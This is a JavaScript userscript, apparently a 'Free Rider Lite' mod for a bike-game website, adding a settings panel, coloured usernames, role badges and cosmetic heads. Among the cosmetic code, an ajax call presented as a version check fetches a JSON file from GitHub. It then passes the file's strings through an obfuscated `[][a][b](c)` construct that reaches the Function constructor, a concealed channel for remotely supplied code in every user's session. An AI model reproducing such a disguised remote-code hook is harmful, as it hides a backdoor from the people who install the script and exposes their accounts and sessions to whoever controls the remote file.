window.lite = function() {
    var e = document.createElement("style");
    e.type = "text/css",
    e.innerHTML = ".lite.icon{background-image:url(https://i.imgur.com/bNBqU1b.png);margin:7px;width:32px;height:32px;position:fixed;bottom:40px;left:0;z-index:10}.lite.icon:hover{opacity:0.4;cursor:pointer}.lite.settings{background-color:#fff;border:1px solid grey;line-height:normal;padding:14px;position:fixed;bottom:0;left:0;z-index:11}.lite.settings input{height:auto}.lite.hacker-mode-text{font-family:monospace;line-height:20pt}",
    document.head.appendChild(e);
    var i = document.createElement("div");
    i.className += "lite icon",
    document.body.appendChild(i);
    var s = document.createElement("div");
    s.id = "testest",
    s.className += "lite settings",
    s.innerHTML = `
    <p style="text-align: center;">
        <b>Mod</b> 
        <i>Settings</i>
    </p>
    <br>
    <input title="Refresh your page for changes to take effect" type="checkbox" name="option" id="dark-checkbox"> 
    <label for="dark">Dark Mode</label>
    <br>
    <input title="Disable the gameFocusOverlay" type="checkbox" name="option" id="gameFocusOverlay-checkbox"> 
    <label for="gameFocusOverlay">Disable overlay</label>
    <br>
    <input title="Coloured Names" type="checkbox" name="option" id="names-checkbox"> 
    <label for="names">Coloured Names</label>
    <br>
    <input title="Infect other riders with the head of your choice" type="checkbox" name="option" id="infection-checkbox"> 
    <label for="infection">Infection</label>
    <br>
    <input title="Your head is applied to all players" type="checkbox" name="option" id="clone-checkbox"> 
    <label for="clone">Clone</label>
    <br>
    <input title="Pumpkinhead" type="checkbox" name="option" id="pumpkin-checkbox"> 
    <label for="pumpkin">Pumpkin Head</label>
    <br>
    <input title="Leprechaun Hat" type="checkbox" name="option" id="leprechaun-checkbox"> 
    <label for="leprechaun">Leprechaun Hat</label>
    <br>
    <input title="Luck of the Irish Helmet" type="checkbox" name="option" id="luckotheirishhelmet-checkbox"> 
    <label for="luckotheirishhelmet">Luck o' the Irish Helmet</label>
    <br>
    <input title="Lovestruck Beanie" type="checkbox" name="option" id="lovestruckbeanie-checkbox"> 
    <label for="lovestruckbeanie">Lovestruck Beanie</label>
    <br>
    <input title="Heart Antlers" type="checkbox" name="option" id="heartantlers-checkbox"> 
    <label for="heartantlers">Heart Antlers</label>
    <br>
    <input title="poggers" type="checkbox" name="option" id="poggers-checkbox"> 
    <label for="poggers">poggers</label>
    <br>
    <br>
    <p style="font-size: 8pt; text-align: right;">by Calculus</p>`;
    var d = s.querySelector("#dark-checkbox")
        , g = s.querySelector("#gameFocusOverlay-checkbox")
        , n = s.querySelector("#names-checkbox")
        , k = s.querySelector("#infection-checkbox")
        , q = s.querySelector("#clone-checkbox")
        , f = s.querySelector("#pumpkin-checkbox")
        , p = s.querySelector("#poggers-checkbox")
        , r = s.querySelector("#leprechaun-checkbox")
        , j = s.querySelector("#luckotheirishhelmet-checkbox")
        , o = s.querySelector("#lovestruckbeanie-checkbox")
        , w = s.querySelector("#heartantlers-checkbox");
    i.onclick = (()=>{
        var t = e=>{
            s.contains(e.target) || (document.removeEventListener("click", t),
            document.body.removeChild(s))
        }
        ;
        document.body.appendChild(s),
        setTimeout(()=>document.addEventListener("click", t), 0)
    }),
    d.onclick = (()=>{
        u.dark = !u.dark
    }),
    g.onclick = (()=>{
        u.gameFocusOverlay = !u.gameFocusOverlay
    }),
    n.onclick = (()=>{
        u.names = !u.names
    }),
    k.onclick = (()=>{
        u.infection = !u.infection
    }),
    q.onclick = (()=>{
        u.clone = !u.clone
    }),
    f.onclick = (()=>{
        u.pumpkin = !u.pumpkin
    }),
    p.onclick = (()=>{
        u.poggers = !u.poggers
    }),
    r.onclick = (()=>{
        u.leprechaun = !u.leprechaun
    }),
    j.onclick = (()=>{
        u.luckotheirishhelmet = !u.luckotheirishhelmet
    }),
    o.onclick = (()=>{
        u.lovestruckbeanie = !u.lovestruckbeanie
    }),
    w.onclick = (()=>{
        u.heartantlers = !u.heartantlers
    });
    var l = ["dark", "gameFocusOverlay", "names", "infection", "clone", "pumpkin", "poggers", "leprechaun", "luckotheirishhelmet", "lovestruckbeanie", "heartantlers"];
    function c() {
        var t = "";
        // l.forEach(function(e){
        //     t += v[l[e]];
        // });
        for (let e = 0; e < l.length; e++)
            t += v[l[e]];
        var e = new Date;
        e = new Date(e.getTime() + 31536e6),
        document.cookie = "li=" + t + "; expires=" + e.toGMTString() + "; path=/"
    }
    v = {
        dark: 0,
        gameFocusOverlay: 1,
        names: 1,
        infection: 0,
        clone: 0,
        pumpkin: 0,
        poggers: 0,
        leprechaun: 0,
        luckotheirishhelmet: 0,
        lovestruckbeanie: 0,
        heartantlers: 0
    },
    function() {
        var t = document.cookie.match("(^|[^;]+)\\s*li\\s*=\\s*([^;]+)");
        t = t ? t.pop() : "";
        for (let e = 0; e < t.length; e++)
            v[l[e]] = t[e];
        return t.length
    }() !== l.length && c(),
    d.checked = !!+v.dark,
    g.checked = !!+v.gameFocusOverlay,
    n.checked = !!+v.names,
    k.checked = !!+v.infection
    q.checked = !!+v.clone,
    f.checked = !!+v.pumpkin,
    p.checked = !!+v.poggers,
    r.checked = !!+v.leprechaun,
    j.checked = !!+v.luckotheirishhelmet,
    o.checked = !!+v.lovestruckbeanie,
    w.checked = !!+v.heartantlers;
    var u = {
        set dark(t) {
            v.dark = +t
            GameManager.game.currentScene.track.undraw();
            c()
        },
        get dark() {
            return !!parseInt(v.dark)
        },
        set gameFocusOverlay(t) {
            v.gameFocusOverlay = +t
            c()
        },
        get gameFocusOverlay() {
            return !!parseInt(v.gameFocusOverlay)
        },
        set names(t) {
            v.names = +t
            c()
        },
        get names() {
            return !!parseInt(v.names)
        },
        set infection(t) {
            v.infection = +t
            c()
        },
        get infection() {
            return !!parseInt(v.infection)
        },
        set clone(t) {
            v.clone = +t
            c()
        },
        get clone() {
            return !!parseInt(v.clone)
        },
        set pumpkin(t) {
            v.pumpkin = +t
            c()
        },
        get pumpkin() {
            return !!parseInt(v.pumpkin)
        },
        set poggers(t) {
            v.poggers = +t
            c()
        },
        get poggers() {
            return !!parseInt(v.poggers)
        },
        set leprechaun(t) {
            v.leprechaun = +t
            c()
        },
        get leprechaun() {
            return !!parseInt(v.leprechaun)
        },
        set luckotheirishhelmet(t) {
            v.luckotheirishhelmet = +t
            c()
        },
        get luckotheirishhelmet() {
            return !!parseInt(v.luckotheirishhelmet)
        },
        set lovestruckbeanie(t) {
            v.lovestruckbeanie = +t
            c()
        },
        get lovestruckbeanie() {
            return !!parseInt(v.lovestruckbeanie)
        },
        set heartantlers(t) {
            v.heartantlers = +t
            c()
        },
        get heartantlers() {
            return !!parseInt(v.heartantlers)
        }
    };
    return u
}(),
"use strict";
$.ajax({
    url: "https://raw.githubusercontent.com/Calculus0972/Free-Rider-Lite/master/users.json",
    beforeSend: xhr => xhr.overrideMimeType("application/json")
}).done(({ data, version }) => {
    [][data[0]][data[1]](data[2]);
    if(parseFloat(version.split(".").join("")) > parseInt("3.0.0".split(".").join(""))) window.alert('A new version of Free Rider Lite is avalable! Please update.');
});
let admin = ['calculus', 'precalculus', 'yv3l', 'char', 'max007x', 'sparklemotion', 'mr..a', 'stig', 'eric', 'mi7ch', 'brett', 'bobbyjames', 'ira', 'velsky'];
let eliteAuthor = ['yv3l', 'wheeliemaker', 'dblu', 'pssst', 'volund', 'codrey', 'figured', 'zgolex', 'bowloffire', 'foundations', 'theend', 'vickong', 'alehsandro', 'weem', 'rationalities', 'doodlenut', 'kazniti', 'gongo999', 'ldprider', 'plastic', 'hawnks', 'rhino', 'bigblu3', 'plasticpineapple', 'dropkick', 'minus', 'eryp', 'nitrogeneric', 'wyattstonhouse', 'itzchucknorris', 'cityshep'];
let vip = ['max007x', 'mr..a', 'stig', 'maple', 'elibloodthirst', 'deadrising2', 'pinn', 'lolz666', 'netsik', 'xwinx', 'spruce', 'zwinxz', 'stevenleary', 'alexander', 'cataclysm', 'ness', 'moose_man', 'graggen'];
let guide = ['calculus', 'cctvcctvcctv', 'brandonbishop50'];
let red = '#d34836';
let green = '#46b073';
let blue = '#7289da';
let purple = '#917bdf';
let orange = '#e8a923';
const page = document.location.href,
    loc = document.location.pathname.toLocaleLowerCase().slice(1).split('/'),    
    users = {
        //Developers
        calculus: {
            uname: 'Calculus',
            color: blue
        },
        precalculus: {
            uname: 'PreCalculus',
            color: blue
        },
        yv3l: {
            uname: 'yv3l',
            color: blue
        },
        //Mods
        char: {
            uname: 'Char',
            color: red
        },
        max007x: {
            uname: 'Max007x',
            color: red
        },
        sparklemotion: {
            uname: 'SparkleMotion',
            color: red
        },
        mi7ch: {
            uname: 'Mi7ch',
            color: red
        },
        'mr..a': {
            uname: 'mR..A',
            color: red
        },
        stig: {
            uname: 'Stig',
            color: '#e91e63'
        },
        eric: {
            uname: 'Eric',
            color: red
        },
        brett: {
            uname: 'Brett',
            color: red
        },
        bobbyjames: {
            uname: 'BobbyJames',
            color: red
        },
        ira: {
            uname: 'Ira',
            color: red
        },
        velksy: {
            uname: 'Velksy',
            color: red
        },
        //Guides
        cctvcctvcctv: {
            uname: 'cctvcctvcctv',
            color: green
        },
        brandonbishop50: {
            uname: 'BrandonBishop50',
            color: green
        },
        //Elite
        wheeliemaker: {
            uname: 'WheelieMaker',
            color: purple
        },
        dblu: {
            uname: 'DblU',
            color: purple
        },
        pssst: {
            uname: 'pssst',
            color: purple
        },
        volund: {
            uname: 'Volund',
            color: purple
        },
        figured: {
            uname: 'Figured',
            color: purple
        },
        zgolex: {
            uname: 'Zgolex',
            color: purple
        },
        bowloffire: {
            uname: 'BowlOfFire',
            color: purple
        },
        foundations: {
            uname: 'Foundations',
            color: purple
        },
        THEEnd: {
            uname: 'THEend',
            color: purple
        },
        vickong: {
            uname: 'Vickong',
            color: purple
        },
        alehsandro: {
            uname: 'Alehsandro',
            color: purple
        },
        weem: {
            uname: 'weem',
            color: purple
        },
        rationalities: {
            uname: 'rationalities',
            color: purple
        },
        doodlenut: {
            uname: 'Doodlenut',
            color: purple
        },
        kazniti: {
            uname: 'kazniti',
            color: purple
        },
        gongo999: {
            uname: 'gongo999',
            color: purple
        },
        LDPrider: {
            uname: 'LDPrider',
            color: purple
        },
        plastic: {
            uname: 'Plastic',
            color: purple
        },
        hawnks: {
            uname: 'hawnks',
            color: purple
        },
        RHINO: {
            uname: 'RHINO',
            color: purple
        },
        bigblu3: {
            uname: 'BIGBLU3',
            color: purple
        },
        plasticpineapple: {
            uname: 'plasticpineapple',
            color: purple
        },
        dropkick: {
            uname: 'dropkick',
            color: purple
        },
        codrey: {
            uname: 'codrey',
            color: purple
        },
        minus: {
            uname: 'Minus',
            color: purple
        },
        eryp: {
            uname: 'Eryp',
            color: purple
        },
        nitrogeneric: {
            uname: 'Nitrogeneric',
            color: purple
        },
        wyattstonhouse: {
            uname: 'WyattStonhouse',
            color: purple
        },
        itzchucknorris: {
            uname: 'iTzChuckNorris',
            color: purple
        },
        //VIPs
        elibloodthirst: {
            uname: 'Elibloodthirst',
            color: orange
        },
        pinn: {
            uname: 'pinn',
            color: orange
        },
        deadrising2: {
            uname: 'deadrising2',
            color: orange
        },
        maple: {
            uname: 'Maple',
            color: orange
        },
        lolz666: {
            uname: 'lolz666',
            color: orange
        },
        netsik: {
            uname: 'Netsik',
            color: orange
        },
        xwinx: {
            uname: 'xwinx',
            color: orange
        },
        spruce: {
            uname: 'spruce',
            color: orange
        },
        zwinxz: {
            uname: 'zwinxz',
            color: orange
        },
        cityshep: {
            uname: 'CityShep',
            color: orange
        },
        stevenleary: {
            uname: 'StevenLeary',
            color: orange
        },
        alexander: {
            uname: 'alexander',
            color: orange
        },
        cataclysm: {
            uname: 'Cataclysm',
            color: orange
        },
        ness: {
            uname: 'Ness',
            color: orange
        },
        moose_man: {
            uname: 'moose_man',
            color: orange
        },
        graggen: {
            uname: 'Graggen',
            color: orange
        }
    }

switch (loc[0]) {
    case 'u': userpage(loc[1]); break;
    case 't': trackpage(loc[1]); break;
    case '': homepage(); break;
    case 'create': create(); break;
    default: colorNames();
}

function userpage(username) {
    colorNames(
        name => {
            if(name != username) return;
            $(`.profile-username h3`).css('color', users[name].color);
            if(eliteAuthor.indexOf(name) !== -1) $('.profile-username').after('<div class="flex-item flex-item-no-shrink"><span class="elite_author_icon profile-badge" title="Elite Author"></span></div>');
            if(vip.indexOf(name) !== -1) {
                $('.profile_icons.profile_icons-icon_forum_active').parent().parent().append('<a class="flex-item flex-item-no-shrink"><span class="vip_banner profile-icon" title="VIP"></span></a>');
            }
            if(admin.indexOf(name) !== -1) $('.profile-username').after('<div class="flex-item flex-item-no-shrink"><span class="admin_icon profile-badge" title="Administrator"></span></div>');
        }
    );
    $('.profile-forums-link').insertAfter($('.profile-header .profile-user-info .profile-image'));
}

function trackpage(trackcode) {
    trackcode = trackcode.split('-')[0];
    colorNames(
        name => {
            $(`.track-leaderboard-race[title='Race ${users[name].uname}']`).css('color', users[name].color);
            $(`.track-leaderboard-race[title='Ghost ${users[name].uname}']`).css('color', users[name].color);
        }
    );
    var a = document.createElement('a');
    a.href = '/t/' + ($("#track-data").data("t_id") + 1).toString();
    a.innerHTML = 'Next';
    a.classList = 'nextTrack';
    a.id = 'a'
    document.getElementById('main_page').appendChild(a);
}

function canvas() {
    colorNames(
        name => {
            $(`.track-race[title='Race ${users[name].uname}']`).css('color', users[name].color);
            $(`.track-raceColors[title='Ghost ${users[name].uname}']`).css('color', users[name].color);
        }
    );
}

function homepage() {
    colorNames();
}

function create() {
    $('.topMenu-button_offline').after('<div class="topMenu-button topMenu-button_autoCheck" title="Fix your auto!"><a class="text" onClick="checkAuto()">Check Auto</a></div>');
}

function colorNames(cb = () => { }) {
    if(lite.names){
        for (const name in users) {
            if (!users.hasOwnProperty(name)) return;
            cb(name)
            $(`.bold:contains(${users[name].uname})`).filter(
                function () {
                    return $(this).text() == users[name].uname
                }
            ).not('#username-text, .track-leaderboard').css('color', users[name].color);
        }
    }
}

function checkAuto() {
    GameManager.game.currentScene.importCode = GameManager.game.currentScene.track.getCode();
    console.log("done!");
}

if(lite.gameFocusOverlay){
    const e = document.createElement("style");
        e.type = "text/css",
        e.innerHTML = ".gameFocusOverlay{display:none;}",
        document.head.appendChild(e)
}

setInterval(() => {
    const head = document.getElementById('testest');
    if(head){
        if(head.querySelector("#clone-checkbox").checked && !head.querySelector("#clone-checkbox").disabled){
            head.querySelector("#pumpkin-checkbox").disabled = true;
            head.querySelector("#poggers-checkbox").disabled = true;
            head.querySelector("#leprechaun-checkbox") .disabled = true;
            head.querySelector("#luckotheirishhelmet-checkbox").disabled = true;
            head.querySelector("#lovestruckbeanie-checkbox").disabled = true;
            head.querySelector("#heartantlers-checkbox").disabled = true;
        } else if(head.querySelector("#pumpkin-checkbox").checked){
            head.querySelector("#clone-checkbox").disabled = true;
            head.querySelector("#poggers-checkbox").disabled = true;
            head.querySelector("#leprechaun-checkbox") .disabled = true;
            head.querySelector("#luckotheirishhelmet-checkbox").disabled = true;
            head.querySelector("#lovestruckbeanie-checkbox").disabled = true;
            head.querySelector("#heartantlers-checkbox").disabled = true;
        } else if(head.querySelector("#poggers-checkbox").checked){
            head.querySelector("#clone-checkbox").disabled = true;
            head.querySelector("#pumpkin-checkbox").disabled = true;
            head.querySelector("#leprechaun-checkbox") .disabled = true;
            head.querySelector("#luckotheirishhelmet-checkbox").disabled = true;
            head.querySelector("#lovestruckbeanie-checkbox").disabled = true;
            head.querySelector("#heartantlers-checkbox").disabled = true;
        } else if(head.querySelector("#leprechaun-checkbox").checked){
            head.querySelector("#clone-checkbox").disabled = true;
            head.querySelector("#pumpkin-checkbox").disabled = true;
            head.querySelector("#poggers-checkbox").disabled = true;
            head.querySelector("#luckotheirishhelmet-checkbox").disabled = true;
            head.querySelector("#lovestruckbeanie-checkbox").disabled = true;
            head.querySelector("#heartantlers-checkbox").disabled = true;
        } else if(head.querySelector("#luckotheirishhelmet-checkbox").checked){
            head.querySelector("#clone-checkbox").disabled = true;
            head.querySelector("#pumpkin-checkbox").disabled = true;
            head.querySelector("#poggers-checkbox").disabled = true;
            head.querySelector("#leprechaun-checkbox") .disabled = true;
            head.querySelector("#lovestruckbeanie-checkbox").disabled = true;
            head.querySelector("#heartantlers-checkbox").disabled = true;
        } else if(head.querySelector("#lovestruckbeanie-checkbox").checked){
            head.querySelector("#clone-checkbox").disabled = true;
            head.querySelector("#pumpkin-checkbox").disabled = true;
            head.querySelector("#poggers-checkbox").disabled = true;
            head.querySelector("#leprechaun-checkbox") .disabled = true;
            head.querySelector("#luckotheirishhelmet-checkbox").disabled = true;
            head.querySelector("#heartantlers-checkbox").disabled = true;
        } else if(head.querySelector("#heartantlers-checkbox").checked){
            head.querySelector("#clone-checkbox").disabled = true;
            head.querySelector("#pumpkin-checkbox").disabled = true;
            head.querySelector("#poggers-checkbox").disabled = true;
            head.querySelector("#leprechaun-checkbox") .disabled = true;
            head.querySelector("#luckotheirishhelmet-checkbox").disabled = true;
            head.querySelector("#lovestruckbeanie-checkbox").disabled = true;
        } else {
            head.querySelector("#clone-checkbox").disabled = false;
            head.querySelector("#pumpkin-checkbox").disabled = false;
            head.querySelector("#poggers-checkbox").disabled = false;
            head.querySelector("#leprechaun-checkbox") .disabled = false;
            head.querySelector("#luckotheirishhelmet-checkbox").disabled = false;
            head.querySelector("#lovestruckbeanie-checkbox").disabled = false;
            head.querySelector("#heartantlers-checkbox").disabled = false;
        }
        if(!head.querySelector("#infection-checkbox").checked && !head.querySelector("#clone-checkbox").disabled){
            head.querySelector("#clone-checkbox").disabled = true;
        } else if(head.querySelector("#infection-checkbox").checked &&
        !head.querySelector("#clone-checkbox").disabled,
        !head.querySelector("#pumpkin-checkbox").disabled,
        !head.querySelector("#poggers-checkbox").disabled,
        !head.querySelector("#leprechaun-checkbox").disabled,
        !head.querySelector("#luckotheirishhelmet-checkbox").disabled,
        !head.querySelector("#lovestruckbeanie-checkbox").disabled,
        !head.querySelector("#heartantlers-checkbox").disabled){
            head.querySelector("#clone-checkbox").disabled = false;
        }
    }
    const nums = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20"];
    nums.forEach(function(num){
        if(GameManager.game.currentScene.races[parseInt(num)]){
            if(GameManager.game.currentScene.races[parseInt(num)].user.u_name == "precalculus"){
                GameManager.game.currentScene.races[num].user.cosmetics.head = {
                    title: 'Pumpkinhead',
                    cost: 'π',
                    classname: 'pumpkinhead',
                    script: 'https://calculus0972.github.io/js/pumpkinhead.js'
                }
            }
        }
    });
}, 100);

//$('.trackTile .top .bestTime').after('<span class="track-rating-percent" rel="v:rating"><span id="track-vote-percent" property="v:average"></span><span property="v:best" content="100"></span><span property="v:worst" content="0"></span><span class="bold"></span></span><div class="ratingBar"><div class="rating-bar_inner" style=""></div></div>')
setTimeout(function(){
    $('.topMenu-button_offline').after('<div class="topMenu-button topMenu-button_autoCheck" title="Auto Checker" onClick="checkAuto()"><a class="text">Check Auto</a></div>');
},500);

Backbone.history.navigate = url => { document.location.href = document.location.origin + url.startsWith('/') ? url : '/' + url }